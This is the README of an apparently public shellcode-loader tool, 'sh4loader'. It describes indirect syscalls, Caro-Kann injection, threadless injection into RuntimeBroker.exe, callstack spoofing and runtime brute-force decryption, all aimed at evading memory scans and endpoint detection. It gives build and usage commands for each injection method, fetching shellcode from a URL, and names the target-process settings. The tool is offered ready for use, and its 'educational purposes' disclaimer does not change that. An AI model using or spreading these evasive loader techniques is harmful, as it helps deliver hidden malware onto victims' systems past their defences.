# sh4loader

<p align="center">
<img src="https://raw.githubusercontent.com/Sh4N4C1/gitbook/main/images/sh4loader.png" alt="sh4loader">
</p>

## ✨ Function

- **Indirect Syscall**: sh4loader use `indirect` syscall.
- **Caro Kann**: Sh4lib use [Caro-Kann](https://github.com/S3cur3Th1sSh1t/Caro-Kann) injection to evade kernel triggered memory scans.
- **Runtime Decrypt Shellcode**: sh4loader will bruteforce shellcode decryption key at runtime.
- **Threadless injection**: sh4loader use threadless injection.
- **CallstackSpoofing**: sh4loader use [CallstackSpoofing](https://github.com/pard0p/CallstackSpoofingPOC)

## Injection Method

- Local Common Injection
- Callstack spoof common Injection
- Caro-Kann Callstack spoof common Injection
- Caro-Kann threadless Injection
- Caro-Kann callstack spoff threadless Injection

## Install

```bash
git clone https://github.com/sh4n4c1/sh4loader.git
cd sh4loader
cargo build --release
./target/release/sh4loader --help
```

if build failed, we need update rustc

```bash
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh # update rustc
```

## Usage

```bash
sh4loader <injection-method> --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
```

## Detail

### Caro-Kann Callstack spoof threadless Injection

```bash
sh4loader kann-threadless-stack --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
```

This implant will find two memory, one for the `xor-encrypted main shellcode`, and one for the `Caro-Kann shellcode`. In threadless injection, it will first hook the target function, and then jump to the fixed shellcode to save the function state and then jump Go to Caro-Kann shellcode, Caro-Kann will help us decrypt and execute the main shellcode

```
  TARGET PROCESS
+-----------------+
|  [function A]   |------+ hooked function called and jump to our <save and jump shellcode> (1)
|    <hooked>     |      |
+-----------------+      |
|   MEMORY HOLE   |      |
| <save and jump> |<-----+ the <save and jump shellcode> will save hooked function state and jump to Caro (2)
|   <Caro-Kann>   |------+ <Caro-Kann shellcode> will sleep and decrypt <main shellcode> (3)
+-----------------+      |
|  [function B]   |      |
+-----------------+      |
|   MEMORY HOLE   |      |
| <main shellcode>|<-----+ <Caro-Kann shellcode> jump to <main shellcode> (4)
+-----------------+
```

1. During the execution of the implant, shellcode is patched to save the jump address.
2. [Callstack spoof](https://github.com/pard0p/CallstackSpoofingPOC) means that NtAPI will be called using the TpReleaseWork proxy.
3. The default function A and function B are `NtWaitForMultipleObjects` and `NtCreateWnfStateName` respectively. The default process is `RuntimeBroker`,because after using API Monitor I found that the RuntimeBroker process seems to call NtWaitForMultipleObjects every other time, and the NtCreateWnfStateName function is used to store the main shellcode.If you want to modify these default functions and processes, you can modify `include/KannThreadStackInj.h` in the implant project directory and Recompile with command `make KannThreadlessStackInj`

```c
// include/KannThreadStackInj.h

#define TARGET_PROCESS "RuntimeBroker.exe"      // Target process
#define TARGET_FUNC_TWO "NtCreateWnfStateName"  // Function B
#define TARGET_DLL "ntdll.dll"                  // Dll export Function A/B
#define TARGET_FUNC "NtWaitForMultipleObjects"  // Function A
```

### Caro-Kann threadless Injection

```bash
sh4loader kann-threadless-stack --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
```

Same as above, but using indirect syscalls instead of proxy calls.

### Caro-Kann Callstack spoof common Injection

```bash
sh4loader kann-spoofstacks --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
```

This Injection Method will use TpRelease proxy call `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtCreateThreadEx` to inject Caro-Kann shellcode and encrypted main shellcode into the local process.

### Callstack spoof common Injection

```bash
sh4loader spoofstacks --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
```

This Injection Method will use TpRelease proxy call `NtAllocateVirtualMemory` + `NtWriteVirtualMemory` + `NtCreateThreadEx` to inject main shellcode into the local process.

### Local Common Injection

```bash
sh4loader common --shellcode-url <url> --output-path <project_output> --shellcode-path <shellcode_path>
```

This Injection Method just use indirect syscalls inject main shellcode into the local process.

## Resources

- https://github.com/pard0p/CallstackSpoofingPOC
- https://github.com/CCob/ThreadlessInject
- https://github.com/S3cur3Th1sSh1t/Caro-Kann
- https://github.com/caueb/ThreadlessStompingKann
- https://0xdarkvortex.dev/hiding-in-plainsight/
- https://maldevacademy.com/

This is my first time writing a loader.I'm not some sort of expert on malware development, C, C++.I will be making a lot of mistakes,I hope that my coding skills get better and better

Obviously, the stuff in this repository is explicitly for educational purposes.
